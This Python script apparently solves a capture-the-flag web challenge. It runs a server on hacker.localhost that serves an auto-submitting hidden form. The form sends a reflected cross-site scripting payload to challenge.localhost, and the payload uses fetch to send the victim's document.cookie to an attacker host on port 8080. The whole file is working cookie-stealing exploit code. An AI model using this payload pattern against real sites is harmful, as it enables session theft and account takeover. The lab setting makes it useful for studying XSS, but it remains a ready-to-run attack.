from http.server import HTTPServer, BaseHTTPRequestHandler

class CustomHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-type", "text/html; charset=utf-8")
        # self.send_header("location",'http://challenge.localhost/publish')
        self.end_headers()
        
        message = """
        <h1>Welcome to hacker.localhost!</h1>

        <form action = 'http://challenge.localhost/ephemeral' method='GET'>
        <input id ='bb' type='hidden' name='msg'> 
        <button id='btn' type='submit' > hacking you </button>
        </form>
        <script> 

        var u = '<script> fetch(\\'http://hacker.localhost:8080?name=\\'+document.cookie)</scr'+'ipt>';
        console.log(u);
        var enc = encodeURIComponent(u);
        console.log(enc);
        document.getElementById('bb').value= u;
        document.getElementById('btn').click();
        </script>
        """
        self.wfile.write(message.encode("utf-8"))

def run(server_class=HTTPServer, handler_class=CustomHandler):
    # Bind to hacker.localhost on port 1337
    server_address = ('hacker.localhost', 1337)
    httpd = server_class(server_address, handler_class)
    print(f"Starting server on http://hacker.localhost:1337 ...")
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        pass
    httpd.server_close()
    print("Server stopped.")

if __name__ == "__main__":
    run()
